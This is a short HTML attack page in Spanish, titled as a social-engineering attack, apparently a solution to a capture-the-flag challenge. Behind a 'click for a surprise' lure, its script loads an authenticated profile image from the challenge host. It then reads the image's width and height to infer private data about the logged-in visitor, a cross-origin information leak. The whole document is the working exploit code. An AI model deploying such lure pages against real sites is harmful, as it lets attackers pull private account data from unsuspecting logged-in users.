<!DOCTYPE html>
<html>
<head>
    <title>Ataque de Ingeniería Social</title>
</head>
<body>
    <h1>Haz clic para ver una sorpresa</h1>
    <div id="resultado"></div>
    <img id="profilePic" style="display:none;" alt="Profile Picture">
    <script>
        const img = document.getElementById('profilePic');
        img.src = 'https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic';

        img.onload = () => {
            const width = img.naturalWidth;
            const height = img.naturalHeight;
            const level = width * height;
            document.getElementById('resultado').innerHTML = `
                <p>Ancho: ${width}px</p>
                <p>Alto: ${height}px</p>
                <p>Nivel de Pepe: ${level}</p>
            `;
        };

        img.onerror = (error) => {
            document.getElementById('resultado').innerHTML = `<p>Error al cargar la imagen: ${error.message || 'No se pudo acceder a la imagen. Verifica que estás logueado.'}</p>`;
        };
    </script>
</body>
</html>
